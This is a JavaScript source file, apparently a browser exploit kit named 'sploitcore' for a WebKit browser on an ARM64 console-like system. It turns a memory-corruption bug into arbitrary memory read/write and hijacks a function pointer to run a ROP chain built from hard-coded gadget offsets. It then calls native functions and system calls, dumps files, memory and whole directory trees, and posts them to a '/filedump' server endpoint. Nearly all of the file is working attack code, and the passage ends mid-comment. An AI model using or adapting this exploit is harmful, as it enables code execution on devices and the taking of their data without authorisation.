var DEBUG = false;

var socket

function send(ep, data) {
	data = JSON.stringify(data);
	try {
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/' + ep, false);
		xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xhr.send('data=' + encodeURIComponent(data));
	} catch(e) {

	}
}
console = {
	log : function(msg) {
		send('log', msg);
	}
};
var log = console.log;
function dlog(msg) {
	if(DEBUG)
		log(msg);
}
window.onerror = function(msg, url, line) {
	send('error', [line, msg]);
  if (socket) {
    socket.send(JSON.stringify({
      type: 'error',
      response: [ line, msg ]
    }))
  }
	location.reload();
};

log('Loaded');

function paddr(lo, hi) {
	if(arguments.length == 1) {
		hi = lo[1];
		lo = lo[0];
	}
	var slo = ('00000000' + lo.toString(16)).slice(-8);
	var shi = ('00000000' + hi.toString(16)).slice(-8);
	return '0x' + shi + slo;
}
function parseAddr(addr) {
  var arr = addr.replace('0x', '').match(/.{8}/g)
  var hi = parseInt(arr[0], 16)
  var lo = parseInt(arr[1], 16)
  return [ lo, hi ]
}
function nullptr(addr) {
	return addr[0] == 0 && addr[1] == 0;
}
function eq(a, b) {
	return a[0] == b[0] && a[1] == b[1];
}
function add2(addr, off) {
	if(typeof(off) == 'number')
		off = [off, 0];

	var alo = addr[0], ahi = addr[1];
	var blo = off[0], bhi = off[1];

	var nlo = ((alo + blo) & 0xFFFFFFFF) >>> 0;
	var nhi = ((ahi + bhi) & 0xFFFFFFFF) >>> 0;

	if((nlo < alo && blo > 0) || (nlo == alo && blo != 0)) {
		nhi = ((nhi + 1) & 0xFFFFFFFF) >>> 0;
	} else if(nlo > alo && blo < 0) {
		nhi = ((nhi - 1) & 0xFFFFFFFF) >>> 0;
	}

	return [nlo, nhi];
}
function offset32(addr, off) {
	return add(addr, off * 4);
}

var sploitcore = function() {
	this.rwbuf = new ArrayBuffer(0x1003 * 4);
	this.tu = new Uint32Array(this.rwbuf);
	for(var i = 0; i < this.tu.length; ++i)
		this.tu[i] = 0x41424344;

	var numbufs = 2000000;
	this.bufs = new Array(numbufs);

	this.allocated = {};

	var bufi = this.setup();
	if(bufi == -1) {
		log('~~failed');
		this.bufs = 0;
		throw 'Failed.';
	}

	this.buf = this.bufs[bufi];

	this.func = document.getElementById;
	this.func.apply(document, ['']); // Ensure the func pointer is cached at 8:9
	this.funcaddr = null;
	this.funcbase = 0x835DC4; // This is the base address for getElementById in the webkit module

	this.leakee = {'b' : null};
	var leaker = {'a' : this.leakee};

	this.stale[1] = leaker;
	var leaklo = this.buf[4], leakhi = this.buf[5];
	this.stale[1] = this.temp;
	this.leakaddr = [leaklo, leakhi];

	this.restlo = this.buf[4];
	this.resthi = this.buf[5];
	this.restsize = this.buf[6];

	/*var taddr = this.getAddr(this);
	var saddr = this.getAddr(this.stale);
	var found = false;
	for(var i = 0; i < 0x1000; i += 2) {
		if(eq(this.read8(taddr, i), saddr)) {
			found = true;
			this.write8([0x00000000, 0xffff0000], taddr, i);
			break;
		}
	}
	if(!found)
		throw 'Could not find this.stale';*/

	this.clearBuffers(bufi);

	this.mainaddr = this.walkList();
	dlog('Main address ' + paddr(this.mainaddr));

	log('~~success');
};


sploitcore.prototype.allocBuffers = function() {
	dlog('Making ' + this.bufs.length + ' buffers');
	for(var i = 0; i < this.bufs.length; ++i)
		this.bufs[i] = new Uint32Array(this.rwbuf);
};

sploitcore.prototype.setup = function() {
	var self = this;
	log('Starting');

	var first = true;
	var arr = new Array(0x100);
	var tbuf = new ArrayBuffer(0x1000);
	arr[0] = tbuf;
	arr[1] = 0x13371337;

	var not_number = {};
	not_number.toString = function() {
		arr = null;
		props["stale"]["value"] = null;

		if(first) {
			self.allocBuffers();
			first = false;
		}

		return 10;
	};

	var props = {
		p0 : { value : 0 },
		p1 : { value : 1 },
		p2 : { value : 2 },
		p3 : { value : 3 },
		p4 : { value : 4 },
		p5 : { value : 5 },
		p6 : { value : 6 },
		p7 : { value : 7 },
		p8 : { value : 8 },
		length : { value : not_number },
		stale : { value : arr },
		after : { value : 666 } 
	};

	var target = [];
	this.stale = 0;
	var before_len = arr.length; 
	Object.defineProperties(target, props);
	this.stale = target.stale;

	dlog('Checking if triggered...');
	if(this.stale.length == before_len) {
		log('Failed to overwrite array');
		return -1;
	}

	dlog('Triggered.  New length: 0x' + this.stale.length.toString(16));

	if(this.stale.length < 2 || this.stale.length == 0x1003) {
		log('Bad length');
		return -1;
	}

	this.temp = new Uint32Array(0x10);
	this.stale[1] = this.temp;

	dlog('Looking for buf...');

	for(var i = 0; i < this.bufs.length; ++i) {
		if(this.bufs[i][0] != 0x41424344) {
			return i;
		}
	}

	log('Buffer not found');
	return -1;
};

sploitcore.prototype.clearBuffers = function(bufi) {
	dlog('Clearing useless buffers');
	for(var i = 0; i < this.bufs.length; ++i)
		if(i != bufi)
			this.bufs[i] = 0;
	dlog('Done with cleanup.');
}

sploitcore.prototype.dump = function(name, buf, count) {
	for(var j = 0; j < count; ++j)
		log(name + '[' + j + '] == 0x' + buf[j].toString(16));
};
sploitcore.prototype.dumpbuf = function(count) {
	this.dump('Buf', this.buf, count);
};
sploitcore.prototype.dumptemp = function(count) {
	this.dump('Tem', this.temp, count);
};
sploitcore.prototype.dumpaddr = function(addr, count) {
	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = count;

	this.dumptemp(count);

	this.buf[4] = this.restlo;
	this.buf[5] = this.resthi;
	this.buf[6] = this.restsize;
};

sploitcore.prototype.read4 = function(addr, offset) {
	if(arguments.length == 1)
		offset = 0;
	var v; // Predeclaring juuuuust to make sure the GC doesn't run in the middle here...

	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = 1 + offset;

	v = this.temp[offset];

	this.buf[4] = this.restlo;
	this.buf[5] = this.resthi;
	this.buf[6] = this.restsize;

	return v;
};
sploitcore.prototype.write4 = function(val, addr, offset) {
	if(arguments.length == 2)
		offset = 0;
	this.buf[4] = addr[0];
	this.buf[5] = addr[1];
	this.buf[6] = 1 + offset;

	this.temp[offset] = val;

	this.buf[4] = this.restlo;
	this.buf[5] = this.resthi;
	this.buf[6] = this.restsize;
};
sploitcore.prototype.read8 = function(addr, offset) {
	if(arguments.length == 1)
		offset = 0;
	return [this.read4(addr, offset), this.read4(addr, offset + 1)];
};
sploitcore.prototype.write8 = function(val, addr, offset) {
	if(arguments.length == 2)
		offset = 0;
    if (typeof(val) == 'number') 
        val = [val, 0];
	this.write4(val[0], addr, offset);
	this.write4(val[1], addr, offset + 1);
};
sploitcore.prototype.getAddr = function(obj) {
	this.leakee['b'] = {'a' : obj};
	return this.read8(this.read8(this.leakaddr, 4), 4);
};
sploitcore.prototype.getAddrDestroy = function(obj) {
	this.leakee['b'] = {'a' : obj};
	var addr = this.read8(this.read8(this.leakaddr, 4), 4);
	// Salt the earth.  No object shall ever grow here again.
	this.write8([0x00000000, 0xffff0000], this.read8(this.leakaddr, 4), 4);
	//this.write8([0x00000000, 0xffff0000], this.leakaddr, 4);
	this.leakee['b'] = 0;
	return addr;
};
sploitcore.prototype.mref = function(off) {
	return add2(this.mainaddr, off);
};

sploitcore.prototype.getBase = function() {
	var tlfuncaddr = this.getAddr(this.func);
	this.funcaddr = this.read8(tlfuncaddr, 6);

	var baseaddr = add2(this.read8(this.funcaddr, 8), -this.funcbase);

	dlog('First module ... ' + paddr(baseaddr));

	return baseaddr;
};

sploitcore.prototype.walkList = function() {
	var addr = this.getBase();
	dlog('Initial NRO at ' + paddr(addr));

	while(true) {
		var baddr = addr;

		var modoff = this.read4(addr, 1);
		addr = add2(addr, modoff);
		var modstr = this.read4(addr, 6);
		addr = add2(addr, modstr);

		// Read next link ptr
		addr = this.read8(addr);
		if(nullptr(addr)) {
			log('Reached end');
			break;
		}

		var nro = this.read8(addr, 8);

		if(nullptr(nro)) {
			dlog('Hit RTLD at ' + paddr(addr));
			addr = this.read8(addr, 4);
			break;
		}

		if(this.read4(nro, 4) != 0x304f524e) {
			log('Something is wrong.  No NRO header at base.');
			break;
		}

		addr = nro;
		dlog('Found NRO at ' + paddr(nro));
	}

	while(true) {
		var nro = this.read8(addr, 8);
		if(nullptr(nro)) {
			dlog('Hm, hit the end of things.  Back in rtld?');
			return;
		}

		if(this.read4(nro, this.read4(nro, 1) >> 2) == 0x30444f4d) {
			dlog('Got MOD at ' + paddr(nro));
			if(this.read4(nro, 4) == 0x8DCDF8 && this.read4(nro, 5) == 0x959620) {
				dlog('Found main module.');
				return nro;
			}
		} else {
			dlog('No valid MOD header.  Back at RTLD.');
			break;
		}

		addr = this.read8(addr, 0);
		if(nullptr(addr)) {
			dlog('End of chain.');
			break;
		}
	}
};

sploitcore.prototype.getSP = function() {
  var jaddr = this.mref(0x39FEEC); // First gadget
  dlog('New jump at ' + paddr(jaddr));
  dlog('Assigning function pointer');

  dlog('Function object at ' + paddr(this.funcaddr));
  var curptr = this.read8(this.funcaddr, 8);

  var fixed = this.mref(0x91F320);
  var saved = new Uint32Array(0x18 >> 2);
  for(var i = 0; i < saved.length; ++i)
    saved[i] = this.read4(fixed, i);
  
  var struct1 = this.malloc(0x48);
  var struct2 = this.malloc(0x28);
  var struct3 = this.malloc(0x518);
  var struct4 = this.malloc(0x38);

  this.write8(struct1, fixed, 0);
  this.write8(this.mref(0x4967F0), fixed, 0x8 >> 2); // Second gadget
  this.write8(this.mref(0x48FE44), fixed, 0x10 >> 2); // Third gadget

  this.write8(struct2, struct1, 0x10 >> 2);

  this.write8(struct3, struct2, 0);
  this.write8(this.mref(0x2E5F88), struct2, 0x20 >> 2);

  this.write8([0x00000000, 0xffff0000], struct3, 0x8 >> 2);
  this.write8(this.mref(0x1892A4), struct3, 0x18 >> 2);
  this.write8(this.mref(0x46DFD4), struct3, 0x20 >> 2);
  this.write8(struct4, struct3, 0x510 >> 2);

  this.write8(this.mref(0x1F61C0), struct4, 0x18 >> 2);
  this.write8(this.mref(0x181E9C), struct4, 0x28 >> 2);
  this.write8(this.mref(0x1A1C98), struct4, 0x30 >> 2);

  this.write8(jaddr, this.funcaddr, 8);

  dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));

  dlog('Assigned.  Jumping.');
  this.func.apply(0x101);
  dlog('Jumped back.');

  var sp = add2(this.read8(struct3, 0), -0x18);

  dlog('Got stack pointer: ' + paddr(sp));

  this.write8(curptr, this.funcaddr, 8);

  dlog('Restored original function pointer.');
  for(var i = 0; i < saved.length; ++i)
    this.write4(saved[i], fixed, i);
  dlog('Restored data page.');

  this.free(struct1);
  this.free(struct2);
  this.free(struct3);
  this.free(struct4);

  dlog('Freed buffers');

  return sp;
};

sploitcore.prototype.malloc = function(bytes) {
	var obj = new Uint32Array(bytes >> 2);
	var addr = this.read8(this.getAddr(obj), 4);
	this.allocated[addr] = obj;
	return addr;
};
sploitcore.prototype.free = function(addr) {
	this.allocated[addr] = 0;
};

sploitcore.prototype.call = function(funcptr, args, registers, dump_regs) {
    if (typeof(funcptr) == 'number') {
        funcptr = add2(this.mainaddr, funcptr);
    }
    if (arguments.length == 3) {
        dump_regs = false;
    } else if (arguments.length == 2) {
        dump_regs = false;
        registers = [];
    } else if (arguments.length == 1) {
        dump_regs = false;
        registers = [];
        args = [];
    } 
    var sp = this.getSP();

    dlog('Starting holy rop');
    var jaddr = this.mref(0x39FEEC); // First gadget addr
    dlog('New jump at ' + paddr(jaddr));
    dlog('Assigning function pointer');

    dlog('Function object at ' + paddr(this.funcaddr));
    var curptr = this.read8(this.funcaddr, 8);
    this.write8(jaddr, this.funcaddr, 8);
    dlog('Patched function address from ' + paddr(curptr) + ' to ' + paddr(this.read8(this.funcaddr, 8)));

    dlog('Setting up structs');

    var fixed = this.mref(0x91F320);
    var saved = new Uint32Array(12);
    for(var i = 0; i < saved.length; ++i)
        saved[i] = this.read4(fixed, i);

    // Begin Gadgets
    var load_x0_w1_x2_x9_blr_x9 = this.mref(0x4967F0);
    var load_x2_x30_mov_sp_into_x2_br_x30 = this.mref(0x433EB4);
    var load_x2_x8_br_x2 = this.mref(0x1A1C98);
    var load_x30_from_sp_br_x2 = this.mref(0x3C2314);
    var returngadg = this.mref(0x181E9C);

    var savegadg = this.mref(0x4336B0);
    var loadgadg = this.mref(0x433620);
    var loadgadg_stage2 = this.mref(0x3A869C);

    var load_x19 = this.mref(0x6C3E4);
    var str_x20 = this.mref(0x117330);
    var str_x8 = this.mref(0x453530);
    var load_and_str_x8 = this.mref(0x474A98);
    var str_x1 = this.mref(0x581B8C);
    var mov_x2_into_x1 = this.mref(0x1A0454);
    var str_x0 = this.mref(0xFDF4C);
    var str_x9 = this.mref(0x1F8280);
    var mov_x19_into_x0 = this.mref(0x12CC68);

    // End Gadgets

    var context_load_struct = this.malloc(0x200);
    var block_struct_1 = this.malloc(0x200);
    var block_struct_2 = this.malloc(0x200);
    var block_struct_3 = this.malloc(0x200);
    var savearea = this.malloc(0x400);
    var loadarea = this.malloc(0x400);
    var dumparea = this.malloc(0x400);

    this.write8(context_load_struct, fixed, 0x00 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x08 >> 2);
    this.write8(load_x2_x30_mov_sp_into_x2_br_x30, fixed, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, fixed, 0x18 >> 2);
    this.write8(block_struct_1, fixed, 0x28 >> 2);

    sp = add2(sp, -0x8030);
    this.write8(load_x2_x8_br_x2, context_load_struct, 0x58 >> 2);
    this.write8(sp, context_load_struct, 0x68 >> 2);
    this.write8(returngadg, context_load_struct, 0x158 >> 2);
    this.write8(add2(sp, 0x8030), context_load_struct, 0x168 >> 2);

    this.write8(savearea, block_struct_1, 0x0 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_1, 0x10 >> 2);
    this.write8(load_x0_w1_x2_x9_blr_x9, block_struct_1, 0x18 >> 2);
    this.write8(block_struct_2, block_struct_1, 0x28 >> 2);
    this.write8(savegadg, block_struct_1, 0x38 >> 2);

    this.write8(load_x2_x8_br_x2, sp, 0x28 >> 2);

    sp = add2(sp, 0x30);

    this.write8(loadarea, block_struct_2, 0x00 >> 2);
    this.write8(loadgadg, block_struct_2, 0x10 >> 2);

    this.write8(sp, loadarea, 0xF8 >> 2); // Can write an arbitrary stack ptr here, for argument passing
    this.write8(loadgadg_stage2, loadarea, 0x100 >> 2); // Return from load to load-stage2
    this.write8(funcptr, loadarea, 0x80 >> 2); 

    sp = add2(sp, -0x80);

    // Write registers for native code.
    if (registers.length > 9) {
        for (var i = 9; i < 30 && i < registers.length; i++) {
            this.write8(registers[i], loadarea, (8 * i) >> 2);
        }
    }

    if (registers.length > 0) {
        for (var i = 0; i <= 8 && i < registers.length; i++) {
            this.write8(registers[i], sp, (0x80 + 8 * i) >> 2);
        }

        if (registers.length > 19) {
            this.write8(registers[19], sp, 0xC8 >> 2);
        }

        if (registers.length > 29) {
            this.write8(registers[29], sp, 0xD0 >> 2);
        }
    }

    if (args.length > 0) {
        for (var i = 0; i < args.length && i < 8; i++) {
            this.write8(args[i], sp, (0x80 + 8 * i) >> 2)
        }
    }

    this.write8(load_x19, sp, 0xD8 >> 2); // Set Link Register for our arbitrary function to point to cleanup rop

    // Stack arguments would be bottomed-out at sp + 0xE0...
    // TODO: Stack arguments support. Would just need to figure out how much space they take up
    // and write ROP above them. Note: the user would have to call code that actually used
    // that many stack arguments, or shit'd crash.

    // ROP currently begins at sp + 0xE0

    this.write8(add2(dumparea, 0x300 - 0x10), sp, (0xE0 + 0x28) >> 2); // Load X19 = dumparea + 0x300 - 0x10
    this.write8(str_x20, sp, (0xE0 + 0x38) >> 2);                      // Load LR with str_x20
    this.write8(add2(dumparea, 0x308), sp, (0x120 + 0x8) >> 2);        // Load X19 = dumparea + 0x308
    this.write8(str_x8, sp, (0x120 + 0x18) >> 2);                      // Load LR with str_x8
    this.write8(add2(dumparea, 0x310 - 0x18), sp, (0x140 + 0x0) >> 2); // Load X19 = dumparea + 0x310 - 0x18
    this.write8(str_x1, sp, (0x140 + 0x18) >> 2);                      // Load LR with str_x1
    this.write8(add2(dumparea, 0x3F8), sp, (0x160 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(add2(dumparea, 0x380), sp, (0x160 + 0x8) >> 2);        // Load X19 = dumparea + 0x380
    this.write8(str_x1, dumparea, 0x380 >> 2);                         // Write str_x1 to dumparea + 0x380
    this.write8(load_and_str_x8, sp, (0x160 + 0x18) >> 2);             // Load LR with Load, STR X8
    this.write8(add2(dumparea, 0x318 - 0x18), sp, (0x180 + 0x8) >> 2); // Load X19 = dumparea + 0x318 - 0x18
    this.write8(mov_x2_into_x1, sp, (0x180 + 0x18) >> 2);              // Load LR with mov x1, x2
    this.write8(add2(dumparea, 0x3F8), sp, (0x1A0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(add2(dumparea, 0x320), sp, (0x1A0 + 0x8) >> 2);        // Load X19 = dumparea + 0x320
    this.write8(str_x0, sp, (0x1A0 + 0x18) >> 2);                      // Load LR with str x0
    this.write8(add2(dumparea, 0x388), sp, (0x1C0 + 0x0) >> 2);        // Load X19 = dumparea + 0x388
    this.write8(add2(dumparea, 0x320), dumparea, 0x388 >> 2);          // Write dumparea + 0x320 to dumparea + 0x388
    this.write8(load_and_str_x8, sp, (0x1C0 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(add2(dumparea, 0x3F8), sp, (0x1E0 + 0x0) >> 2);        // Load X20 with scratch space
    this.write8(add2(dumparea, 0x328 - 0x58), sp, (0x1E0 + 0x8) >> 2); // Load X19 = dumparea + 0x328 - 0x58
    this.write8(str_x9, sp, (0x1E0 + 0x18) >> 2);                      // Load LR with STR X9
    this.write8(add2(dumparea, 0x390), sp, (0x200 + 0x0) >> 2);        // Load X19 with dumparea + 0x390
    this.write8(block_struct_3, dumparea, 0x390 >> 2);                 // Write block struct 3 to dumparea + 0x390
    this.write8(load_and_str_x8, sp, (0x200 + 0x18) >> 2);             // Load LR with load, STR X8
    this.write8(load_x0_w1_x2_x9_blr_x9, sp, (0x220 + 0x18) >> 2);     // Load LR with gadget 2

    // Block Struct 3
    this.write8(dumparea, block_struct_3, 0x00 >> 2);
    this.write8(load_x30_from_sp_br_x2, block_struct_3, 0x10 >> 2);
    this.write8(savegadg, block_struct_3, 0x38 >> 2);

    this.write8(add2(str_x20, 0x4), sp, (0x240 + 0x28) >> 2);          // Load LR with LD X19, X20, X30
    this.write8(add2(savearea, 0xF8), sp, (0x270 + 0x0) >> 2);         // Load X20 with savearea + 0xF8 (saved SP)
    this.write8(add2(dumparea, 0x398), sp, (0x270 + 0x8) >> 2);        // Load X19 with dumparea + 0x398
    this.write8(add2(sp, 0x8080), dumparea, 0x398 >> 2);               // Write SP to dumparea + 0x38
    this.write8(load_and_str_x8, sp, (0x270 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(add2(savearea, 0x100), sp, (0x290 + 0x0) >> 2);        // Load X20 with savearea + 0x100 (saved LR)
    this.write8(add2(dumparea, 0x3A0), sp, (0x290 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A0
    this.write8(returngadg, dumparea, 0x3A0 >> 2);                     // Write return gadget to dumparea + 0x3A0
    this.write8(load_and_str_x8, sp, (0x290 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(add2(savearea, 0xC0), sp, (0x2B0 + 0x0) >> 2);         // Load X20 with savearea + 0xC0 (saved X24)
    this.write8(add2(dumparea, 0x3A8), sp, (0x2B0 + 0x8) >> 2);        // Load X19 with dumparea + 0x3A8
    this.write8([0x00000000, 0xffff0000], dumparea, 0x3A8 >> 2);       // Write return gadget to dumparea + 0x3A8
    this.write8(load_and_str_x8, sp, (0x2B0 + 0x18) >> 2);             // Load X30 with LD, STR X8
    this.write8(savearea, sp, (0x2D0 + 0x8) >> 2);                     // Load X19 with savearea
    this.write8(mov_x19_into_x0, sp, (0x2D0 + 0x18) >> 2);             // Load X30 with mov x0, x19.
    this.write8(loadgadg, sp, (0x2F0 + 0x18) >> 2);                    // Load X30 with context load

    sp = add2(sp, 0x8080);

    dlog('Assigned.  Jumping.');
    this.func.apply(0x101);
    dlog('Jumped back.');

    var ret = this.read8(dumparea, 0x320 >> 2);

    this.write8(curptr, this.funcaddr, 8);

    dlog('Restored original function pointer.');

    if (dump_regs) {
        log('Register dump post-code execution:');
        for (var i = 0; i <= 30; i++) {
            if (i == 0) {
                log('X0: ' + paddr(this.read8(dumparea, 0x320 >> 2)));
            } else if (i == 1) {
                log('X1: ' + paddr(this.read8(dumparea, 0x310 >> 2)));
            } else if (i == 2) {
                log('X2: ' + paddr(this.read8(dumparea, 0x318 >> 2)));
            } else if (i == 8) {
                log('X8: ' + paddr(this.read8(dumparea, 0x308 >> 2)));
            } else if (i == 9) {
                log('X9: ' + paddr(this.read8(dumparea, 0x328 >> 2)));
            } else if (i == 20) {
                log('X20: ' + paddr(this.read8(dumparea, 0x300 >> 2)));
            } else if (i == 16 || i == 19 || i == 29 || i == 30) { 
            	log('X' + i + ': Not dumpable.');
            } else {
                log('X' + i + ': ' + paddr(this.read8(dumparea, (8 * i) >> 2)));
            }
        }
    }


    for(var i = 0; i < saved.length; ++i)
        this.write4(saved[i], fixed, i);
    dlog('Restored data page.');

    dlog('Native code at ' + paddr(funcptr) + ' returned: ' + paddr(ret));


    this.free(context_load_struct);
    this.free(block_struct_1);
    this.free(block_struct_2);
    this.free(block_struct_3);
    this.free(savearea);
    this.free(loadarea);
    this.free(dumparea);
    return ret;
};

sploitcore.prototype.svc = function(id, registers, dump_regs) {
	var svc_list = {
		0x01: 0x3BBE10,
		0x02: 0x3BBE28,
		0x03: 0x3BBE30,
		0x04: 0x3BBE38,
		0x05: 0x3BBE40,
		0x06: 0x3BBE48,
		0x07: 0x3BBE60,
		0x08: 0x3BBE68,
		0x09: 0x3BBE80,
		0x0A: 0x3BBE88,
		0x0B: 0x3BBE90,
		0x0C: 0x3BBE98,
		0x0D: 0x3BBEB0,
		0x0E: 0x3BBEB8,
		0x0F: 0x3BBED8,
		0x10: 0x3BBEE0,
		0x11: 0x3BBEE8,
		0x12: 0x3BBEF0,
		0x13: 0x3BBEF8,
		0x14: 0x3BBF00,
		0x15: 0x3BBF08,
		0x16: 0x3BBF20,
		0x17: 0x3BBF28,
		0x18: 0x3BBF30,
		0x19: 0x3BBF48,
		0x1A: 0x3BBF50,
		0x1B: 0x3BBF58,
		0x1C: 0x3BBF60,
		0x1D: 0x3BBF68,
	  //0x1E: ,
		0x1F: 0x3BBF70,
	  //0x20: ,
	  	0x21: 0x3BBF88,
	  	0x22: 0x3BBF90,
	  //0x23: 0x,
	  //0x24: 0x,
	  	0x25: 0x3BBF98,
	  	0x26: 0x3BBFB0,
	  	0x27: 0x3BBFB8,
	  	0x28: 0x3BBFC0,
	  	0x29: 0x3BBFC8,
	  //0x2A-0x4F
	  	0x50: 0x3BBFE0,
	  	0x51: 0x3BBFF8,
	  	0x52: 0x3BC000,
	};

	if (!(id in svc_list)) {
		log('Failed to call svc 0x' + id.toString(16) + '.');
	}

	return this.call(svc_list[id], [], registers, dump_regs);
}

sploitcore.prototype.querymem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;
	var meminfo = this.malloc(0x20);
	var pageinfo = this.malloc(0x8);
	var svcQueryMemory = 0x3BBE48;

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['FREE', 'RESERVED', 'IO', 'STATIC', 'CODE', 'PRIVATE', 'SHARED', 'CONTINUOUS', 'ALIASED', 'ALIAS', 'ALIAS CODE', 'LOCKED'];
	this.call(svcQueryMemory, [meminfo, pageinfo, addr]);

	var ms = this.read8(meminfo, 0x10 >> 2);
	if(!raw && ms[1] == 0 && ms[0] < memstates.length)
		ms = memstates[ms[0]];
	else if(!raw)
		ms = 'UNKNOWN'
	var mp = this.read8(meminfo, 0x18 >> 2);
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.read8(meminfo, 0 >> 2), this.read8(meminfo, 0x8 >> 2), ms, mp, this.read8(pageinfo, 0 >> 2)];

	this.free(meminfo);
	this.free(pageinfo);

	return data;
};

sploitcore.prototype.getservicehandle = function(name) {
	var handlePtr = this.malloc(0x4);
	var smGetServiceHandle = this.bridge(0x3AD15C, int, void_p, char_p, int);
	log('smGetServiceHandle("' + name + '")...');
	var res = smGetServiceHandle(handlePtr, name, name.length);
	var handle = this.read4(handlePtr);
	this.free(handlePtr);
	log('smGetServiceHandle("' + name + '") == 0x' + res[0].toString(16) + ', 0x' + handle.toString(16));
	return [res, handle]
}

sploitcore.prototype.str2buf = function(str) {
	var buf = this.malloc(str.length + 8);
	// Shitty memcpy of the string into buffer
	for (var i = 0; i < 0x100 && i < str.length; i += 4) {
		var val = 0;
		for (var j = 0; j < 4 && i + j < str.length; j++) {
			val |= (str.charCodeAt(i+j) & 0xFF) << (8 * j);
		}
		this.write4(val, buf, i >> 2);
	}
	if (str.length % 4 == 0) {
		this.write4(0, buf, str.length >> 2);
	}

	return buf;
};

sploitcore.prototype.getFileSize = function(fhandle) {
	var fseek = this.bridge(0x438B18, null, void_p, int, int);
	var ftell = this.bridge(0x438BE0, int, void_p);

	fseek(fhandle, 0, 2);
	var fsize = ftell(fhandle);
	fseek(fhandle, 0, 0);

	return fsize;
};

sploitcore.prototype.dumpFile = function(fn) {
	var fopen = this.bridge(0x43DDB4, void_p, char_p, char_p); //FILE * fopen ( const char * filename, const char * mode );
	var fread = this.bridge(0x438A14, int, void_p, int, int, void_p); //size_t fread ( void * ptr, size_t size, size_t count, FILE * stream );
	var fclose = this.bridge(0x4384D0, int, void_p); //int fclose ( FILE * stream );

	var fhandle = fopen(fn, 'r');
	log('foo ' + paddr(fhandle));
	if (!nullptr(fhandle)) {
		var fsize = this.getFileSize(fhandle);
		var ofs = 0;
		var arr = new ArrayBuffer(0x800000);
		var int8view = new Uint8Array(arr);
		var outbuf = this.read8(this.getAddr(int8view), 4);
		var sz = fsize[0]; // XXX: Add primitive for converting our double-uint32 arrays into numbers
		while (sz > 0) {
			if (sz < 0x800000) {
				arr = new ArrayBuffer(sz);
				int8view = new Uint8Array(arr);
				outbuf = this.read8(this.getAddr(int8view), 4);
			}
			fread(outbuf, 1, sz < 0x800000 ? sz : 0x800000, fhandle);
			var xhr = new XMLHttpRequest();
			xhr.open('POST', '/filedump', false);
			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
			xhr.setRequestHeader('Content-Disposition', fn);
			xhr.send(int8view);
			xhr = null;
			sz -= 0x800000;
		}
		log(fn + ' is ' + paddr(fsize) + ' bytes.');
		
		fclose(fhandle);
	} else {
		log('Failed to open file '+ fn + '!');
	}
};

sploitcore.prototype.memdump = function(offset, size, fn) {
	var totalSize = size;
	
	var arr = new ArrayBuffer(0x800000);
	var int8view = new Uint8Array(arr);
	var int32view = new Uint32Array(arr);
	var idx = 0;

	var memcpy = this.bridge(0x44338C, int, void_p, void_p, int);
	
	log('Dumping memory!');
	while(totalSize > 0)
	{
		if(totalSize >= 0x800000)
		{
			size = 0x800000;
		}
		else
		{
			size = totalSize;
			arr = new ArrayBuffer(size);
			int8view = new Uint8Array(arr);
			int32view = new Uint32Array(arr);
		}
		

		memcpy(this.read8(this.getAddr(int8view), 4), add2(offset, idx), size);
		
		idx += size;
				
		var xhr = new XMLHttpRequest();
		xhr.open('POST', '/filedump', false);
		xhr.setRequestHeader('Content-Type', 'application/octet-stream');
		xhr.setRequestHeader('Content-Disposition', fn);
		xhr.send(int8view);
		xhr = null;
		
		totalSize -= size;
	}
	log('Dumped memory succesfully!');
}

sploitcore.prototype.dirlist = function(dirPath) {
	var dumpFiles = true;
	
	var OpenDirectory = this.bridge(0x233894, int, void_p, char_p, int); //int OpenDirectory(_QWORD *handle, char *path, unsigned int flags)
	var ReadDirectory = this.bridge(0x2328B4, int, void_p, void_p, void_p, int); //int ReadDirectory(_QWORD *sDirInfo, _QWORD *out, _QWORD *handle, __int64 size)
	var CloseDirectory = this.bridge(0x232828, int, void_p); //int CloseDirectory(_QWORD *handle)
	
	var entrySize = 0x310;
	var numFilesToList = 128;
	var fileListSize = numFilesToList*entrySize;
	var handlePtr = this.malloc(0x8);
	var sDirInfo = this.malloc(0x200);
	var sFileList = this.malloc(fileListSize);
	var ret = OpenDirectory(handlePtr,dirPath,3);
	log('OpenDirectory ret=' + ret);
	
	var handle = this.read8(handlePtr);
	ret = ReadDirectory(sDirInfo,sFileList,handle,numFilesToList);
	log('ReadDirectory ret=' + ret);
	
	var arr = new ArrayBuffer(fileListSize);
	var int8view = new Uint8Array(arr);
	var int32view = new Uint32Array(arr);
	
	log('File Listing for ' + dirPath);
	for(var i = 0; i < fileListSize/4; ++i)
	{
		int32view[i] = this.read4(sFileList, i);
		if((i % (entrySize/4)) == ((entrySize/4)-1))
		{
			var string = '';
			var j=Math.floor(i/(entrySize/4)) * entrySize;
			var isFile = (j + 0x304)/4;
			var fileSize = (j + 0x304)/4;
			while(int8view[j] != 0)
			{
				string += String.fromCharCode(int8view[j]);
				j++;
			}
			if(string != '')
			{
				log(((int32view[isFile] != 0) ? "FILE   " : "FOLDER ") + dirPath + string + ' ' + ((int32view[isFile] != 0) ? ' Size = ' + fileSize : ''));
				
				if(int32view[isFile] == 0) //is Folder
				{
					this.dirlist(dirPath + string + '/');
				}
				else
				{
					if(dumpFiles)
						this.dumpFile(dirPath + string);
				}
			}
		}
	}
	log('End Listing');
	
	/*var xhr = new XMLHttpRequest();
	xhr.open('POST', '/filedump', false);
	xhr.setRequestHeader('Content-Type', 'application/octet-stream');
